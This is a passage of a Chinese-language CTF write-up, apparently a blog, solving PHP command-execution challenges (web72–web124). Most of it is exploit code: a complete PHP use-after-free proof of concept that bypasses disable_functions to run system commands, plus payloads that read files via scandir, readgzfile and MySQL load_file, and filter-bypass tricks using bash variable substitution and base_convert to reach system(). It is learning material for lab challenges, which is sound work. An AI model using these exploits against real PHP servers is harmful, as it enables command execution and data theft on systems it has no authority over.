class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;ls /;cat /flag0.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//uaf脚本</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"> </span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过URL编码之后用Post上传</p><h2 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_export(scandir(&#x27;/&#x27;));本题没有open_basedir限制（也可以用上一题的UAF，但需改写相关关键字） 发现有flagc.txt 或者 echo(implode(&#x27; &#x27;,scandir(&#x27;/&#x27;)));数组拼接为字符串 include,require包含失败 可用readgzfile(&#x27;/flagc.txt&#x27;); 拿到Flag</span><br></pre></td></tr></table></figure><h2 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同上</span><br></pre></td></tr></table></figure><h2 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同上</span><br></pre></td></tr></table></figure><h2 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试发现题目过滤了所有小写字母和一些特殊符号，用之前题目的方式绕过空格和字符串，如果有数字又得采用自增方式绕过 $&#123;PATH:A&#125;为环境变量的最后一个字母，一般环境变量命名规范为/bin所以取到n $&#123;PWD:~A&#125;当前系统环境linux+apache，所以pwd为/var/www/html取到了l $&#123;PATH:~A&#125;$&#123;PWD:~A&#125; = nl命令 ????.???用来匹配flag.php 最终拼接成 $&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$&#123;IFS&#125;????.???</span><br><span class="line"></span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PATH:$&#123;#TERM&#125;:$&#123;SHLVL:~A&#125;&#125; ????.???</span><br></pre></td></tr></table></figure><h2 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125;     ====&gt;   t</span><br><span class="line">$&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125;    ====&gt;   /</span><br><span class="line">/bin/cat flag.php</span><br><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</span><br></pre></td></tr></table></figure><h2 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">首先需要理解正则 /[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/ 它会绕过数字和特殊符号，而一旦存在一个字符，它就会匹配出后续内容当做函数名，并检查其是否在白名单内</span><br><span class="line"></span><br><span class="line">所以函数名必须在白名单内，且参数必须为数字和特殊符号，因为这样的话，正则的第一项迟迟不成立，那么后续的匹配就不会开始，也就绕过了白名单</span><br><span class="line"></span><br><span class="line">hex十六进制 5f474554 (不能有字母所以十六进制不行)</span><br><span class="line"></span><br><span class="line">所以现在问题是如何构造system(cat flag.php) 参数为数字，又能将参数转化为字符串的函数，首先想到hex2bin这个函数，但是它并不在白名单内，所以需要构造hex2bin这个字符串，再拿去调用 先echo base_convert(&#x27;hex2bin&#x27;,36,10);得到hex2bin的10进制数字base_convert(37907361743,10,36)就等于hex2bin</span><br><span class="line"></span><br><span class="line">再echo hexdec(bin2hex(&#x27;_GET&#x27;));得到_GET的10进制数字为1598506324</span><br><span class="line"></span><br><span class="line">所以hex2bin(dechex(1598506324))就等于_GET，为什么不能直接用16进制而非要传递一个10进制转换成16进制多此一举呢，也是因为16进制参数为0x123456它存在一个x，会匹配正则的第一项，从而将后续123456当成函数名导致不能过掉白名单</span><br><span class="line"></span><br><span class="line">所以base_convert(37907361743,10,36)(dechex(1598506324))就等于_GET了</span><br><span class="line"></span><br><span class="line">再提交参数1=system&amp;2=cat+flag.php，也可以不提交数字，提交一个在白名单的函数名作为参数名也可以过白名单匹配</span><br><span class="line"></span><br><span class="line">最终构造payload</span><br><span class="line"></span><br><span 